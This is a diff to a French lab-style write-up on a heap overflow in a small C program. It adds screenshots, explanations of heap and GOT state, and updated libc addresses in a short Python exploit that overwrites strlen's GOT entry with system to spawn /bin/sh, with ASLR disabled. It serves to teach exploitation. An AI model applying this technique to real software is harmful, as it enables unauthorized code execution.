@@ -138,7 +138,25 @@ int main(int argc, char **argv){
 }
 ```
 
+On peut voir que le programme run normalement
+
+![basic](.src/img/firsrun.png)
+
 Grâce à un heap overflow de la structure 'bot' nous allons pouvoir modifier l'adresse de la structure 'nick'. Ceci va nous donner une écriture arbitraire. Où pourrions nous écrire quelque chose d'interéssant? La Global offset table qui redirige vers les fonctions de la Glibc me parait une bonne cible. On pourrais par exemple remplacer l'adresse de 'strlen' par 'system' et executer '/bin/sh' à la place du message.
+
+On peut calculer l'offset des fonctions
+
+![func](.src/img/offset func.png)
+
+On peut voir l'adresse de strlen dans la GOT
+
+Au premier appel on résoud l'adresse de strlen
+
+![got](.src/img/strlengot1.png)
+
+après la résolution on voit que ca pointe bien vers strlen
+
+![got](.src/img/strlengot2.png)
 
 exploit:
 
@@ -152,11 +170,11 @@ pad = "AAAAAAAA"*4
 read_addr = struct.pack("<Q", 0x555555755030) # adresse de strlen dans la GOT
 s1 = pad + read_addr + "\n"
 
-strlen = 0x7ffff7a89190 # adresse de strlen dans la Glibc
+strlen = 0x7ffff7e7d710 # adresse de strlen dans la Glibc
 
 
 # step 2 arbitrary writing
-system = struct.pack("<Q", strlen-0xfd10) # adresse de system de la Glibc par offset
+system = struct.pack("<Q", strlen-0x43720) # adresse de system de la Glibc par offset
 s2 = system + "\n" + "/bin/sh\n"
 
 sys.stdout.write(s1 + s2)
@@ -173,3 +191,19 @@ Pour que cet exploit marche il faut désactiver l'ASLR qui va changer l'adresse 
 Si on avait une lecture arbitraire, on pourrait leaker une adresse de la Glibc et ainsi calculer l'offset de 'system' même avec la randomisation des adresses de la Glibc.
 
 on obtient bien un shell:
+
+![exploit](.src/img/exploit.png)
+
+On peut voir ce qui se passe dans la heap:
+
+avant la copy le heap overflow on voit l'adresse de bot et de nick qui pointe vers leurs chaine de caractère respectivement.
+
+![got](.src/img/heap1.png)
+
+ensuite après le heap overflow, on voit que l'adresse de nick pointe vers strlen@got:
+
+![got](.src/img/heap2.png)
+
+Si on regarde dans strlen@plt, on voit que ca pointe désormais vers system
+
+![got](.src/img/strlengot3.png)
